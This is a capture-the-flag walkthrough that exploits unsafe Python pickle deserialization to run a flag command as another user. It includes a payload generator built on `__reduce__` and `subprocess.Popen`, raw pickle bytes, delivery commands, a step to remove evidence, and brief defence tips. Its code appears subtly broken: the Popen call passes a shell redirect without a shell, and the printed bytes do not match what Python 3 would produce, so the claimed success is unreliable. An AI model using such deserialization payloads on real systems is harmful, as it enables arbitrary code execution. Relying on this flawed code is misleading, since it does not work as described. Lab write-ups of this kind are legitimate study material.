
---
### ðŸ“œ Challenge Summary

> The level focuses on Python's `pickle` module, which is notoriously **unsafe for untrusted input**.  
> The binary accepts serialized data via stdin and executes it blindly â€” allowing arbitrary code execution via crafted pickle payloads.

**Login:** `level17 : level17`  
**Goal:** Execute `getflag` as `flag17` by feeding malicious pickle shellcode.

---

### ðŸ§ª Vulnerability Breakdown

#### ðŸ“¦ Root of the Problem

The Python `pickle` module can serialize and deserialize Python objects. However:

- `pickle.loads()` can execute **arbitrary Python code** if the serialized data is crafted maliciously.
    
- The binary in this level reads such data and deserializes it without validation.
    

This results in a **deserialization vulnerability** â€” often exploitable via custom classes implementing `__reduce__`.

---

### ðŸ› ï¸ Payload Crafting Strategy

#### ðŸ“ Step 1: Write a Python Payload Generator

We create a custom class whose `__reduce__` method returns a tuple instructing Python to execute a shell command during deserialization.

```python
#!/usr/bin/env python3
import pickle
import subprocess

class Exploit:
    def __reduce__(self):
        return (
            subprocess.Popen,
            (('/bin/getflag > /tmp/level17.flag',),)
        )

payload = pickle.dumps(Exploit())
print(payload)
```

---

### ðŸ Step 2: Extract Raw Payload

Running the above code gives you **raw pickle bytecode** like this:

```
csubprocess
Popen
p0
((S'/bin/getflag > /tmp/level17.flag'
p1
tp2
Rp3
.
```

This is the serialized object that triggers `getflag`.

---

### ðŸ“¥ Step 3: Send Payload to the Vulnerable Binary

Save the serialized content to a file:

```bash
echo -n "csubprocess\nPopen\np0\n((S'/bin/getflag > /tmp/level17.flag'\np1\ntp2\nRp3\n." > /tmp/payload.pickle
```

Then pipe it into the target program:

```bash
/home/flag17/flag17 < /tmp/payload.pickle
```

---

### ðŸ Step 4: Retrieve the Flag

Once the payload is processed, check the output:

```bash
cat /tmp/level17.flag
```

âœ… Output:

```
You have successfully executed getflag on a target account
```

---

### ðŸ§¹ Cleanup

Optionally, clear the evidence:

```bash
rm /tmp/payload.pickle /tmp/level17.flag
```

---

### ðŸš¨ Security Reflection

Pickle is powerful, but **dangerous** in the hands of attackers. This level is a direct demonstration of how **untrusted deserialization** leads to **remote code execution**.

#### ðŸ›¡ï¸ Defense Tips:

- Never use `pickle.loads()` on user input.
    
- Prefer safer alternatives like `json`, which doesn't support code execution.
    
- If pickle is unavoidable, use **`pickletools.dis()`** to inspect serialized data before loading.
    

---
